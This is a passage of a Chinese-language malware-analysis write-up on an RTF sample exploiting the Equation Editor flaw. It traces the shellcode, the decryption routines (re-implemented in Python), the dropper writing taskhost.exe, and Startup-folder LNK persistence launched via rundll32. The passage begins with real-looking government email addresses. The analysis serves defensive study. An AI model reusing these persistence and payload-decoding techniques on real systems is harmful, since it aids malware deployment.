+&#34;Wing Commander Raji kurian&#34; &lt;yatch.master@gov.in&gt;
+&#34;SLO 54 ASP&#34; &lt;teacher_town@nic.in&gt;
+&#34;Gp Capt Atul Kumar Arora&#34; &lt;moon.light@gov.in&gt;
+&#34;Flt Lt Richa Bansal&#34; &lt;mtl.amer@nic.in&gt;
+</code></pre><hr><h1 id=樣本5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9>樣本(5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9)
+<a class=anchor href=#%e6%a8%a3%e6%9c%ac5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9>#</a></h1><h2 id=惡意程式-1>惡意程式
+<a class=anchor href=#%e6%83%a1%e6%84%8f%e7%a8%8b%e5%bc%8f-1>#</a></h2><h3 id=檔案資訊-1>檔案資訊
+<a class=anchor href=#%e6%aa%94%e6%a1%88%e8%b3%87%e8%a8%8a-1>#</a></h3><ol><li>DIE(Detect It Easy)
+<img src=https://hackmd.io/_uploads/BygTPpT2T.png alt=圖片>
+從DIE來看並沒有什麼特別的packer或是linker，反而出現RTF格式，一開始不知道這是什麼，但根據<sup id=fnref:4><a href=#fn:4 class=footnote-ref role=doc-noteref>4</a></sup>的說明，應該可以理解成比較廣泛性的Word文字檔案<blockquote><p>富文本格式（Rich Text Format, 一般簡稱為RTF）是由微軟公司開發的跨平台文檔格式。大多數的文字處理軟體都能讀取和保存RTF文檔。RTF是Rich TextFormat的縮寫，意即多文本格式。這是一種類似DOC格式（Word文檔）的檔案，有很好的兼容性，使用Windows“附屬檔案”中的“寫字板”就能打開並進行編輯。RTF是一種非常流行的檔案結構，很多文字編輯器都支持它。一般的格式設定，比如字型和段落設定，頁面設定等等信息都可以存在RTF格式中，它能在一定程度上實現word與wps檔案之間的互訪。</p></blockquote></li><li>File/Stat/Exiftool
+從以下的結果來看，這個檔案的確是RTF格式且Created Time是在2019年
+:::spoiler Command Result<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
+</span></span><span style=display:flex><span>5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9: Rich Text Format data, version 1, ANSI, code page 936, default middle east language ID <span style=color:#ae81ff>1025</span>
+</span></span><span style=display:flex><span>$ exiftool 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
+</span></span><span style=display:flex><span>ExifTool Version Number         : 12.40
+</span></span><span style=display:flex><span>File Name                       : 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
+</span></span><span style=display:flex><span>Directory                       : .
+</span></span><span style=display:flex><span>File Size                       : <span style=color:#ae81ff>217</span> KiB
+</span></span><span style=display:flex><span>File Modification Date/Time     : 2023:08:14 11:54:52+08:00
+</span></span><span style=display:flex><span>File Access Date/Time           : 2024:02:29 16:55:48+08:00
+</span></span><span style=display:flex><span>File Inode Change Date/Time     : 2024:02:29 16:55:48+08:00
+</span></span><span style=display:flex><span>File Permissions                : -rwxrwxrwx
+</span></span><span style=display:flex><span>File Type                       : RTF
+</span></span><span style=display:flex><span>File Type Extension             : rtf
+</span></span><span style=display:flex><span>MIME Type                       : text/rtf
+</span></span><span style=display:flex><span>Warning                         : Unsupported RTF encoding cp936. Will assume Latin.
+</span></span><span style=display:flex><span>Last Modified By                : Koby
+</span></span><span style=display:flex><span>Create Date                     : 2019:12:24 10:28:00
+</span></span><span style=display:flex><span>Modify Date                     : 2019:12:24 10:28:00
+</span></span><span style=display:flex><span>Revision Number                 : <span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>Total Edit Time                 : <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>Pages                           : <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>Words                           : <span style=color:#ae81ff>252</span>
+</span></span><span style=display:flex><span>Characters                      : <span style=color:#ae81ff>1441</span>
+</span></span><span style=display:flex><span>Characters With Spaces          : <span style=color:#ae81ff>1690</span>
+</span></span><span style=display:flex><span>Internal Version Number         : <span style=color:#ae81ff>117</span>
+</span></span><span style=display:flex><span>$ stat 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
+</span></span><span style=display:flex><span>  File: 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
+</span></span><span style=display:flex><span>  Size: <span style=color:#ae81ff>222012</span>          Blocks: <span style=color:#ae81ff>440</span>        IO Block: <span style=color:#ae81ff>4096</span>   regular file
+</span></span><span style=display:flex><span>Device: 66h/102d        Inode: <span style=color:#ae81ff>2814749767539972</span>  Links: <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>Access: <span style=color:#f92672>(</span>0777/-rwxrwxrwx<span style=color:#f92672>)</span>  Uid: <span style=color:#f92672>(</span> 1000/ sbk6401<span style=color:#f92672>)</span>   Gid: <span style=color:#f92672>(</span> 1000/ sbk6401<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Access: 2024-02-29 16:55:48.947690500 +0800
+</span></span><span style=display:flex><span>Modify: 2023-08-14 11:54:52.000000000 +0800
+</span></span><span style=display:flex><span>Change: 2024-02-29 16:55:48.947690500 +0800
+</span></span><span style=display:flex><span> Birth: -
+</span></span></code></pre></div>:::</li><li>這一題在沒有看VirusTotal或是Any.Run的情況之下，我在local VM內真的看不出來有什麼問題，後來忍不住上網看一下相關的hash，發現他是使用==CVE-2017-11882==這個由Microsoft提出的漏洞開發出來的malware file<sup id=fnref:5><a href=#fn:5 class=footnote-ref role=doc-noteref>5</a></sup>，而比較新的版本大部分都已經被patch了，所以我在VM內才會找不出相關的攻擊痕跡(浪費了很多時間)
+<img src=https://hackmd.io/_uploads/HkR0X4V66.png alt="螢幕擷取畫面 2024-03-05 135304">
+從上圖來看，沒有看到任何執行EQNEDT32.EXE的process，為了能夠在local端實際看到攻擊的軌跡，我從學校的授權軟體網站中下載了Office 2016(原本是2021)，才發現相關的patch還沒普及到這個版本(是不是要通報一下計中呢??🤔)
+<img src=https://hackmd.io/_uploads/H1NNEE4p6.png alt=image>
+:::danger
+這個CVE是錯的，和EQNEDT32.EXE有關的CVE有三個:
+CVE-2017-11882
+CVE-2018-0802
+CVE-2018-0798
+所以其實不是目前的這一個，這也證明了我找超久都沒有找到的EQNEDT32.EXE的洞是哪裡
+:::</li></ol><h3 id=執行流程-1>執行流程
+<a class=anchor href=#%e5%9f%b7%e8%a1%8c%e6%b5%81%e7%a8%8b-1>#</a></h3><p>:::info
+因為這一題我是在已知漏洞CVE的前提下進行分析，所以我會先假裝在不知道的情況下，敘述我可能會如何分析，如果途中有某個地方是我不知道如何繼續進行或是某個background knowledge我一定先知道，我會標註其中
+:::
+:::danger
+因為不能使用線上sandbox tools，所以其實應該要有command sense是直接使用RTFOBJ進行Parsing，並且針對Embedded的File去OSINT他就可能可以不需要透過AnyRun知道他是哪一個CVE造成的惡意樣本
+:::</p><ol><li><p>Process Monitor
+在執行一個可疑的file時，我會嘗試先用process monitor以及wireshark錄製其中盡可能詳細的所有過程(當然實行前一定要先snapshot)，然後看一下中間的過程有無觸及到CreateFile、WriteFiile以及registry這樣的操作
+為了要更準確的filter不必要的紀錄，我設定的條件是:</p><ol><li>Operation is WriteFile then Include</li><li>Process Name is Wireshark.exe then Exclude</li><li>Process Name is dumpcap.exe then Exclude
+<img src=https://hackmd.io/_uploads/SJBQ2N4p6.png alt=image>
+接著我就發現有一個==EQNEDT32.exe==的process寫了一個intel.wll的檔案到<code>C:\Users\REM\AppData\Roaming\Microsoft\Word\STARTUP\intel.wll</code>
+<img src=https://hackmd.io/_uploads/HJF9n44p6.png alt=image>
+當然這也要有足夠的經驗才有辦法更準確的猜測這是一個可能有問題的操作，所以這一個process有一部分是參考網路上CVE的說明才更確定這個方向是對的</li></ol></li><li><p>Analyze EQNEDT32.exe
+為了更進一步知道我的想法是否正確，所以我修改了我的filter rule→</p><ol><li>Process Name is EQNEDT32.exe then Include</li><li>Process Name is Wireshark.exe then Exclude</li><li>Process Name is dumpcap.exe then Exclude</li></ol><p>發現有很多不同的process都有BoF的問題
+<img src=https://hackmd.io/_uploads/SkNnCEN6a.png alt=image>
+而直到比較後端的操作才出現CreateFile、WriteFile、CloseFile的操作，主要是
+<code>C:\Users\REM\AppData\Roaming\Microsoft\Word\STARTUP\intel.wll</code>和<code>C:\Users\REM\AppData\Local\Temp\8.t</code>
+<img src=https://hackmd.io/_uploads/rkPe1HVa6.png alt=image></p></li><li><p>所以，到目前為止可以很確定的事情是這個RTF File，裡面運藏了一些檔案，所以我打算針對這個file進行靜態的分析，但是我當然看不懂office針對RTF的語法和結構為何，所以根據<sup id=fnref:6><a href=#fn:6 class=footnote-ref role=doc-noteref>6</a></sup>的說明提到可以用<a href=https://github.com/decalage2/oletools>RTFOBJ</a>這個tool，幫忙parse其中的內容，結果如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ rtfobj -s all 5bbf2643a601e632a49406483c8f
+</span></span><span style=display:flex><span>c5262a76e206bd969f2ba3f4f2e238768ab9
+</span></span><span style=display:flex><span>rtfobj 0.60.1 on Python 3.8.17 - http://decalage.info/python/oletools
+</span></span><span style=display:flex><span>THIS IS WORK IN PROGRESS - Check updates regularly!
+</span></span><span style=display:flex><span>Please report any issue at https://github.com/decalage2/oletools/issues
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================================</span>
+</span></span><span style=display:flex><span>File: <span style=color:#e6db74>&#39;5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9&#39;</span> - size: <span style=color:#ae81ff>222012</span> bytes
+</span></span><span style=display:flex><span>---+----------+---------------------------------------------------------------
+</span></span><span style=display:flex><span>id |index     |OLE Object
+</span></span><span style=display:flex><span>---+----------+---------------------------------------------------------------
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>  |0000E970h |format_id: <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>Embedded<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>   |          |class name: b<span style=color:#e6db74>&#39;Package&#39;</span>
+</span></span><span style=display:flex><span>   |          |data size: <span style=color:#ae81ff>73928</span>
+</span></span><span style=display:flex><span>   |          |OLE Package object:
+</span></span><span style=display:flex><span>   |          |Filename: <span style=color:#e6db74>&#39;8.t&#39;</span>
+</span></span><span style=display:flex><span>   |          |Source path: <span style=color:#e6db74>&#39;C:\\Aaa\\tmp\\8.t&#39;</span>
+</span></span><span style=display:flex><span>   |          |Temp path <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\8.t&#39;</span>
+</span></span><span style=display:flex><span>   |          |MD5 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;8eac8203cf56f2b24753986353deac7e&#39;</span>
+</span></span><span style=display:flex><span>   |          |File Type: Unknown file type
+</span></span><span style=display:flex><span>---+----------+---------------------------------------------------------------
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>  |00032B90h |format_id: <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>Embedded<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>   |          |class name: b<span style=color:#e6db74>&#39;Equation.2\x00\x124Vx\x90\x124VxvT2&#39;</span>
+</span></span><span style=display:flex><span>   |          |data size: <span style=color:#ae81ff>6436</span>
+</span></span><span style=display:flex><span>   |          |MD5 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;a09e82c26f94f3a9297377120503a678&#39;</span>
+</span></span><span style=display:flex><span>---+----------+---------------------------------------------------------------
+</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>  |00032B76h |Not a well-formed OLE object
+</span></span><span style=display:flex><span>---+----------+---------------------------------------------------------------
+</span></span><span style=display:flex><span>Saving file from OLE Package in object <span style=color:#75715e>#0:</span>
+</span></span><span style=display:flex><span>  Filename <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;8.t&#39;</span>
+</span></span><span style=display:flex><span>  Source path <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;C:\\Aaa\\tmp\\8.t&#39;</span>
+</span></span><span style=display:flex><span>  Temp path <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\8.t&#39;</span>
+</span></span><span style=display:flex><span>  saving to file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_8.t
+</span></span><span style=display:flex><span>  md5 8eac8203cf56f2b24753986353deac7e
+</span></span><span style=display:flex><span>Saving file embedded in OLE object <span style=color:#75715e>#1:</span>
+</span></span><span style=display:flex><span>  format_id  <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>  class name <span style=color:#f92672>=</span> b<span style=color:#e6db74>&#39;Equation.2\x00\x124Vx\x90\x124VxvT2&#39;</span>
+</span></span><span style=display:flex><span>  data size  <span style=color:#f92672>=</span> <span style=color:#ae81ff>6436</span>
+</span></span><span style=display:flex><span>  saving to file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_object_00032B90.bin
+</span></span><span style=display:flex><span>  md5 a09e82c26f94f3a9297377120503a678
+</span></span><span style=display:flex><span>Saving raw data in object <span style=color:#75715e>#2:</span>
+</span></span><span style=display:flex><span>  saving object to file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_object_00032B76.raw
+</span></span><span style=display:flex><span>  md5 a3540560cf9b92c3bc4aa0ed52767b8a
+</span></span></code></pre></div><p>我發現其實內藏的檔案其實是<code>8.t</code></p></li><li><p>Analyze RTF Malware File
+我想要跟一下這個RTF因為stack overflow的問題到底是怎麼變成RCE的，所以我先用Proess Monitor知道他會call到CreateFile這個API，因此我先用x32dbg attach eqnedt32.exe這個file，然後設定breakpoint到kernelbase.dll中的CreateFileA這個API
+<img src=https://hackmd.io/_uploads/r12X9ZUpa.png alt=圖片>
+接著我直接啟動malware file，dbg會停在CreateFile上，此時我回去看stack上的return address
+<img src=https://hackmd.io/_uploads/rJzpc-ITp.png alt=圖片>
+發現他會return到<code>026A878F</code>這個地方(每一次執行會不一樣，有點類似ASLR，不過通常會把要執行的shellcode放在<code>26AXXXX</code>開頭的地方)，這個位置存的應該就是他的shellcode
+<img src=https://hackmd.io/_uploads/r1v_iWLpT.png alt=圖片></p></li><li><p>詳細的分析怎麼做到這一步shellcode的
+首先，我已經知道他是怎麼利用stack overflow的方式放上shellcode，但是我找了超久都還是沒有找到2016版本的漏洞在哪裡，應該說根據<sup id=fnref:7><a href=#fn:7 class=footnote-ref role=doc-noteref>7</a></sup>的說明，我知道因為在複製字體名稱的時候，沒有檢查字的長度，所以可以利用這一點蓋到return address，也就是說，可以讓程式跳到我們預先設定好的shellcode上面，那為什麼找不到他檢查長度的地方呢?因為我的做法是利用stack上的backtrace去看call完CreateFile之後要回到哪裡去判斷他是什麼時候篡改了return address，但跟完動態發現他似乎很早就已經把shellcode放上去了(只是什麼時候不太清楚)，所以礙於時間的關係，我先往下分析，詳細的流程如下:
+<img src=https://hackmd.io/_uploads/H1r90hLap.png alt=圖片>
+到最後他會到<code>0x430BFB</code>這個位置然後跳到<code>0x268A48C</code>，請注意看一下底下一點的code當中有一個<code>jmp 0x268A4BE</code>，這個一跳過去就會使dbg重新編譯過，這也是shellcode很常使用到的技巧
+<img src=https://hackmd.io/_uploads/BJaheaI6T.png alt=圖片>
+<img src=https://hackmd.io/_uploads/Sy7BbpLa6.png alt=圖片>
+若順著這一條往下執行，他ret的地方就會變成，==0x26A6E8A==(當然每一次都不一樣，因為是動態的)
+<img src=https://hackmd.io/_uploads/HJZhZpUap.png alt=圖片></p><hr><ul><li><p>從這一段開始就是有關於呼叫windows API的部分，而且可以看到，剛跳過去的時候也是一樣call了==0x26A6E8E==，讓真正的shellcode藏在其中
+<img src=https://hackmd.io/_uploads/SkDJf6Lpp.png alt=圖片></p></li><li><p>Decrypt
+這一段應該就是在decrypt後續的shellcode，可以看到他不斷loop做一件事情，那就是XOR目前取得的word bytes(0xC390)，總共應該做了0x8BA次，每次改2 Bytes
+<img src=https://hackmd.io/_uploads/S1gLGp8ap.png alt=圖片>
+可以看到decrypt後就真的能辨識一些字元
+<img src=https://hackmd.io/_uploads/rJtgETLpT.png alt=圖片>
+decrypt完的code截圖如下，這才是真正的shellcode
+<img src=https://hackmd.io/_uploads/BJb9w6Lpp.png alt=圖片></p></li><li><p>做的事情如下</p><ol><li><p>解析出<code>ntdll.dll</code>和<code>kernelbase.dll</code>
+這一段很有趣，他應該就是我在<a href=https://hackmd.io/@SBK6401/Bkd51XRM6>2023 Lab - WinMalware - Dynamic API Resolution Background</a>中學到的API Resolution技巧</p><blockquote><p>不靠 loader，在 runtime 自行爬取系統結構，取得所需的 Windows API</p></blockquote><p><img src=https://hackmd.io/_uploads/HygbsTU6T.png alt=圖片>
+第一個使用的dll是<code>msvcrt.dll</code>，以此類推，我們可以把下一個function當作是在爬<code>kernel32.dll</code>
+<img src=https://hackmd.io/_uploads/Syb5TpITT.png alt=圖片></p></li><li><p>Fetch API
+這個是我看到熟悉的老朋友→Magic Header(MZ和PE字樣)，其實這一段就是在fetch各個dll file的API(只要給定dll的file當作參數給這個function，就可以爬到想要的API)，我自己看到的總共有以下個:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GetProcAddresss-&gt;kernel32.dll
+</span></span><span style=display:flex><span>VirtualProtext-&gt;kernel32.dll
+</span></span><span style=display:flex><span>clearerr-&gt;ucrtbase.dll
+</span></span><span style=display:flex><span>CreateFileA-&gt;kernel32.dll
+</span></span><span style=display:flex><span>GetFileSize-&gt;kernel32.dll
+</span></span><span style=display:flex><span>ReadFile-&gt;kernel32.dll
+</span></span><span style=display:flex><span>WriteFile-&gt;kernel32.dll
+</span></span><span style=display:flex><span>CloseHandle-&gt;kernel32.dll
+</span></span><span style=display:flex><span>CreateProcessA-&gt;kernel32.dll
+</span></span><span style=display:flex><span>GetModuleFileNameA-&gt;kernel32.dll
+</span></span><span style=display:flex><span>ResumeThread-&gt;kernel32.dll
+</span></span><span style=display:flex><span>TerminateProcess-&gt;kernel32.dll
+</span></span><span style=display:flex><span>---
+</span></span><span style=display:flex><span>GetThreadContext-&gt;kernel32.dll
+</span></span><span style=display:flex><span>ReadProcessMemory-&gt;kernel32.dll
+</span></span><span style=display:flex><span>GetModuleHandleA-&gt;kernel32.dll
+</span></span><span style=display:flex><span>WriteProcessMemory-&gt;kernel32.dll
+</span></span><span style=display:flex><span>SetThreadContext-&gt;kernel32.dll
+</span></span><span style=display:flex><span>ZwUnmapViewOfSection-&gt;ntdll.dll
+</span></span></code></pre></div><p><img src=https://hackmd.io/_uploads/S108gJvTa.png alt=圖片></p></li><li><p>CreateFile & VitualAlloc & Decrypt
+Fetch完API後，他就Create <code>C:\Users\REM\AppData\Local\Temp\8.t</code>
+<img src=https://hackmd.io/_uploads/HkCUTDda6.png alt=圖片>
+並且取得他的大小後開一個同樣大小的空間給current process，接著他用ReadFile把讀取倒的所有內容放到該空間中
+<img src=https://hackmd.io/_uploads/ryuB0vdTa.png alt=圖片>
+取完資料後如下
+<img src=https://hackmd.io/_uploads/Sk6wRvu6T.png alt=圖片>
+ReadFile完後就開始解密原本的內容，詳細的解密過程如下(一整大段都是):
+<img src=https://hackmd.io/_uploads/rJj2d_Op6.png alt=圖片>
+:::spoiler Psudo Code</p><pre tabindex=0><code class=language-python! data-lang=python!>from Crypto.Util.number import long_to_bytes
+data = open(&#39;./5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_8.t&#39;, &#39;rb&#39;).read()
+key = 0x48B53A6C
+idx = 0
+file_size = len(data)
+decrypt_data = b&#34;&#34;
+if file_size &gt; 0:
+    while idx &lt; file_size:
+        ebx = 7
+        while ebx &gt; 0:
+            ecx = key &gt;&gt; 26
+            ecx ^= key
+            ecx &gt;&gt;= 3
+            ecx ^= key
+            key *= 2
+            if key &gt; 0x100000000:
+                key -= 0x100000000
+            ecx &amp;= 1
+            key |= ecx
+            key += 1
+            ebx -= 1
+        decrypt_data += long_to_bytes(data[idx] ^ (key &amp; 0xFF))
+
+        idx += 1
+open(&#39;./8.t_decrypt&#39;, &#39;wb&#39;).write(decrypt_data)
+</code></pre><p>:::</p></li><li><p>CreateFile & WriteFile
+接著他創了<code>C:\Users\REM\AppData\Roaming\Microsoft\Word\STARTUP\intel.wll</code>這個file必且寫上一些東西，其實就是我們剛剛decrypt的檔案</p></li></ol></li></ul></li><li><p>Analyze intel.wll
+首先他先Decrypt儲存在內部的執行檔(有加密過的)，然後把他寫到</p><pre tabindex=0><code>C:\Users\REM\AppData\Local\Temp\taskhost.exe
+</code></pre><p>這個檔案中，解密就是一個了無新意的XOR，解密的code如下:
+:::spoiler</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#66d9ef>__cdecl</span> <span style=color:#a6e22e>CreateTask</span>(LPCSTR lpFileName)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  LPCVOID <span style=color:#f92672>*</span>lpBuffer; <span style=color:#75715e>// edi
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  HANDLE FileA; <span style=color:#75715e>// ebp
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> i; <span style=color:#75715e>// esi
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> counter; <span style=color:#75715e>// eax
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  _BYTE <span style=color:#f92672>*</span>v5; <span style=color:#75715e>// ecx
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  DWORD NumberOfBytesWritten; <span style=color:#75715e>// [esp+8h] [ebp-4h] BYREF
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                                                <span style=color:#75715e>// 寫到Task.exe的大小總共是0xB000，每一次寫16bytes(記得要從後面寫回來)，要寫2816次
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  lpBuffer <span style=color:#f92672>=</span> (LPCVOID <span style=color:#f92672>*</span>)operator <span style=color:#a6e22e>new</span>(<span style=color:#ae81ff>16u</span>);
+</span></span><span style=display:flex><span>  FileA <span style=color:#f92672>=</span> <span style=color:#a6e22e>CreateFileA</span>(lpFileName, GENERIC_WRITE, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>, CREATE_NEW, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( FileA <span style=color:#f92672>!=</span> (HANDLE)<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> )
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> ( i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2816</span>; <span style=color:#f92672>++</span>i )
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      counter <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>      v5 <span style=color:#f92672>=</span> (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>Enc_Task_exe <span style=color:#f92672>+</span> <span style=color:#ae81ff>16</span> <span style=color:#f92672>*</span> i <span style=color:#f92672>+</span> <span style=color:#ae81ff>15</span>;
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>*</span>((_BYTE <span style=color:#f92672>*</span>)lpBuffer <span style=color:#f92672>+</span> counter<span style=color:#f92672>++</span>) <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>v5<span style=color:#f92672>--</span> <span style=color:#f92672>^</span> <span style=color:#ae81ff>6</span>;
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>while</span> ( counter <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x10</span> );
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>WriteFile</span>(FileA, lpBuffer, <span style=color:#ae81ff>0x10u</span>, <span style=color:#f92672>&amp;</span>NumberOfBytesWritten, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    operator <span style=color:#a6e22e>delete</span>(lpBuffer);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>CloseHandle</span>(FileA);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>:::
+我簡單的寫了一個python script去驗證他，如下:
+:::spoiler</p><pre tabindex=0><code class=language-python! data-lang=python!>from Crypto.Util.number import long_to_bytes
+
+BUFFER_SIZE = 16
+num_iterations = 2816
+
+lpBuffer = b&#34;&#34;
+unk_10005030 = open(&#39;Enc_Task_exe.txt&#39;, &#39;r&#39;).read().split(&#39; &#39;)
+FileA = open(&#39;Dec_Task_exe.txt&#39;, &#39;wb&#39;)
+
+# Loop through the iterations
+for i in range(num_iterations):
+    counter = 15
+    while counter &gt;= 0:
+        current_byte = unk_10005030[i * BUFFER_SIZE + counter]
+        lpBuffer += long_to_bytes(ord(bytes.fromhex(current_byte)) ^ 6)
+        counter -= 1
+
+FileA.write(lpBuffer)
+</code></pre><p>:::
+同時他也create了一個LNK file在</p><pre tabindex=0><code>C:\Users\REM\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WordPress.lnk
+</code></pre><p>詳細的c code如下
+:::spoiler</p><pre tabindex=0><code class=language-clike! data-lang=clike!>void CreateLNK(char *a1, char *a2, char *a3, char *a4, ...)
+{
+  void *v4; // ecx
+  bool v5; // sf
+  int v6; // edx
+  LPVOID ppv; // [esp+40h] [ebp-4h] BYREF
+  void *retaddr; // [esp+44h] [ebp+0h]
+  int v9; // [esp+58h] [ebp+14h]
+  va_list va; // [esp+5Ch] [ebp+18h] BYREF
+
+  va_start(va, a4);
+  v9 = va_arg(va, _DWORD);
+  ppv = v4;
+  if ( CoInitialize(0) &gt;= 0 )
+  {
+    if ( CoCreateInstance(&amp;rclsid, 0, 1u, &amp;riid, &amp;ppv) &gt;= 0 )
+    {
+      (*(*ppv + 80))(ppv, a1, ppv);
+      (*(*retaddr + 44))(retaddr, a3);
+      (*(*retaddr + 68))(retaddr, v9, 0);
+      (*(*retaddr + 60))(retaddr, 7);
+      if ( (**retaddr)(retaddr, &amp;unk_10004100, &amp;a2) &gt;= 0 )
+      {
+        v5 = (*(*a2 + 24))(a2, a4, 0) &lt; 0;
+        ppv = a2;
+        v6 = *a2;
+        if ( !v5 )
+        {
+          (*(v6 + 8))();
+          (*(*ppv + 8))(ppv);
+          CoUninitialize();
+          return;
+        }
+        (*(v6 + 8))(ppv);
+      }
+      (*(*retaddr + 8))(retaddr);
+    }
+    CoUninitialize();
+  }
+}
+</code></pre><p>:::
+雖然看的不是很懂，但總之這個LNK內部儲存的東西如下，簡單來說就是用rundll32.exe跑剛剛解密的taskhost.exe:</p><pre tabindex=0><code>C:\WINDOWS\system32\rundll32.exe url.dll,FileProtocolHandler %TMP%\taskhost.exe
+</code></pre><p>只要打開內容看一下就知道了，當然如果可以用工具parse一下會更準確，但礙於時間的關係就先往下分析
+<img src=https://hackmd.io/_uploads/HypaHtKa6.png alt=圖片></p></li><li><p>Analyze taskhost.exe
+請查閱後門功能這個Section</p></li></ol><h3 id=通訊協定-1>通訊協定
+<a class=anchor href=#%e9%80%9a%e8%a8%8a%e5%8d%94%e5%ae%9a-1>#</a></h3><p>因為我沒有實際架一個server讓他連線，所以我是直接錄一個失敗的connection，看他丟了什麼出來
+<img src=https://hackmd.io/_uploads/rkwPnVcT6.png alt=圖片>
+:::danger
+如果之後還有時間可以想辦法架一個C2 Server，實際去構造連線的封包
+:::</p><h3 id=加解密演算法-1>加解密演算法
+<a class=anchor href=#%e5%8a%a0%e8%a7%a3%e5%af%86%e6%bc%94%e7%ae%97%e6%b3%95-1>#</a></h3><p>如上所述</p><h3 id=後門功能-1>後門功能
